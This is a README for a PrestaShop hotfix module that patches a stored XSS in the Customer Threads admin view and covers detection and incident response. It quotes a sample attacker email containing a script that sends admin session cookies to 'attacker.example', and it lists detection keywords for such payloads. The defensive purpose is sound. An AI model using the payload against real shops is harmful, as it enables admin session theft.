tecno_xss_hotfix

Security hotfix module for PrestaShop — patches stored XSS vulnerability GHSA-w9f3-qc75-qgx9.

SeverityCritical — CVSS 9.3 / 10
TypeStored XSS (CWE-79)
VectorCustomer email field → Back-Office Customer Threads view
AffectedPS 1.7.x, PS 8.x < 8.2.6, PS 9.x < 9.1.1
AuthorTecnoacquisti.com®

The vulnerability

An attacker registers an account (or submits a contact form) using a crafted email address containing HTML/JavaScript — for example:

"><script>fetch('https://attacker.example/c?'+document.cookie)</script>@x.com

When a Back-Office administrator opens the Customer Threads page, the email is rendered verbatim in the Smarty template without escaping, executing the script in the admin session. The attacker obtains the session cookie and gains full BO access.

Root cause — two unpatched locations:

  1. {admin}/themes/default/template/controllers/customer_threads/helpers/view/view.tpl

{$thread->email} rendered without |escape:'html':'UTF-8'

  1. Some classes/Validate.php implementations accept quoted email local-parts through Egulias or Symfony's 'mode' => 'loose' validation. The module identifies the actual ValidateCore::isEmail() implementation rather than assuming its behavior from the PrestaShop version.

The stock native regular expression checked in PrestaShop 1.7.4.0 and 1.7.6.9 already rejects <, > and double quotes. It does not need an additional validator guard. The template is checked separately: the stock 1.7.4.0 template mixes escaped and unescaped email occurrences, so its rendering still requires correction.

What the module does

On install / Apply Patches

TargetAction
{admin}/themes/default/template/…/view.tplAdds `\escape:'html':'UTF-8' to {$thread->email}`

Recognized native restrictive validatorShows an informational status; leaves the validator unchanged
Unrecognized validator or templateShows an unknown status for manual review; does not claim it is already patched

Every bare email token in the template must be escaped before the template is reported as patched. Reapplying a successful patch leaves the file and its original backup unchanged.

Before any write a .tecno-hotfix-backup file is created next to the original.

The template patch is permanent. Uninstalling the module does not revert it. This is intentional: the fix must survive module removal.

When an isEmail() override is present

override/classes/Validate.php is never modified automatically. The module detects the override and shows the code snippet to apply manually.

Recognition limits

The validator check uses tokenized method bodies, ignoring formatting and comments while retaining string literals. It recognizes the upstream implementations checked in 1.7.4.0, 1.7.6.9, 1.7.7.0, 1.7.8.11, 8.0.0, 8.0.2, 8.2.5, 8.2.6, 9.1.0 and 9.1.1, including identical implementations in other releases. Already injected Egulias guards are recognized, including previously duplicated guards.

A custom or newer implementation with a different body requires manual review. A recognized validator does not certify the integrity of the complete file, other overrides, the database or the installation. Automatic patching on installation and the declared PrestaShop 1.7+ compatibility remain enabled.

Forensic DB scan

The admin page includes a one-click database scan that searches ps_customer, ps_customer_thread, ps_customer_message and ps_employee for XSS indicators of compromise (IoC): email addresses or message bodies containing <, >, ", script, javascript:, event handler attributes, document.cookie, eval(, etc.

If hits are found, guided remediation steps are shown inline.

Installation

  1. Upload the tecno_xss_hotfix directory to {shop}/modules/
  2. Install from Back-Office > Modules > Module Manager
  3. Patches are applied automatically on install
  4. Review both statuses on the module configuration page. A recognized native restrictive validator has an informational status; unknown implementations require manual review.

To re-apply (e.g. after a PS core update that overwrote Validate.php): open the module configuration page and click Apply / Re-apply Patches.

Manual fix — isEmail() override

If override/classes/Validate.php contains isEmail(), review its existing validation and add this guard at the top of the method body if needed. Preserve all existing validation after it. The same review applies to an unrecognized core implementation:

// GHSA-w9f3-qc75-qgx9: insert before the existing validation logic.
if (!empty($email) && preg_match('/[<>"]/', $email)) {
    return false;
}

If the vulnerability was exploited — immediate actions

  1. Reset all admin passwords — Back-Office > Team > Employees
  2. Rotate cookie keys — _COOKIE_KEY_ and _COOKIE_IV_ in app/config/parameters.php (PS 8/9) or config/settings.inc.php (PS 1.7)
  3. Invalidate active sessions — run on your database:

``sql UPDATE ps_employee SET cookie_token = ''; ``

  1. Audit admin accounts — delete any employee you do not recognise
  2. Search access logs for requests to the Customer Threads admin page around the time of the suspicious record
  3. Check for modified files:

``bash find /var/www/html -name ".php" -newer /var/www/html/index.php \ -not -path "/cache/" -not -path "/var/*" ``

  1. Review ps_configuration for unexpected changes to shop URL, email settings, or payment parameters
